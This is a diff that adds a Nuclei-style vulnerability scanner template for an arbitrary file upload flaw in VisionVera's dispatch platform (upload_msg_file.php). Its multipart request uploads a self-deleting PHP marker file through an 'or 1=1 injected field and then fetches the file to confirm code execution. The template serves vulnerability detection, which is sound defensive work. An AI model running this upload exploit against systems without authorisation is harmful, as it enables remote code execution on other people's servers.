@@ -1,0 +1,57 @@
+id: visionvera-zhihuidiaodu-upload-msg-file-php-upload
+
+info:
+  name: visionvera zhihuidiaodu upload_msg_file.php 文件上传漏洞
+  author: bl
+  severity: critical
+  tags: 指挥调度管理平台
+  description: |-
+    该模板用于识别visionvera zhihuidiaodu组件中upload_msg_file.php接口存在的任意文件上传漏洞。攻击者可借助该端点上传恶意文件，若服务器配置不当，可能导致远程代码执行或存储型内容注入。实际影响取决于目标版本、部署配置及接口暴露范围。
+  remediation: >-
+    升级到已修复版本，仅允许业务必需的文件类型，校验文件实际内容而不能只检查扩展名；将上传文件存放在 Web 根目录之外并使用随机生成的文件名，禁止上传目录执行脚本，同时限制文件大小和访问权限。
+  
+variables:
+  rboundary: '{{to_lower(rand_base(8))}}'
+  s1: '{{to_lower(rand_base(5))}}'
+  s2: '{{to_lower(rand_base(20))}}'
+
+flow: http(1) && http(2)
+
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/client/upload_msg_file.php'
+    headers:
+      Content-Type: multipart/form-data; boundary={{rboundary}}
+    body: "--{{rboundary}}\r\nContent-Disposition: form-data; name=\"timestamp\"\r\n\r\n2\r\n--{{rboundary}}\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\n1\r\n--{{rboundary}}\r\nContent-Disposition: form-data; name=\"usernumber\"\r\n\r\n'or 1=1;\r\n--{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{s1}}.php\"\r\nContent-Type: application/xml\r\n\r\n<?php echo \"{{s2}}\"; unlink(__FILE__); ?>\r\n--{{rboundary}}\r\nContent-Disposition: form-data; name=\"sign\"\r\n\r\n7b80c0a24f609eae984329b5132c2f0c\r\n--{{rboundary}}--\r\n"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: word
+        words:
+          - "\"msg\":\"ok\""
+        part: body
+        internal: true
+    extractors:
+      - type: regex
+        name: uploadfilename
+        part: body
+        group: 1
+        internal: true
+        regex:
+          - "((;\\\\/(.*)\\\\/(.*).php))"
+  - method: GET
+    path:
+      - '{{BaseURL}}/upload/msg/images/''or%201=1{{uploadfilename}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{s2}}"
+        part: body
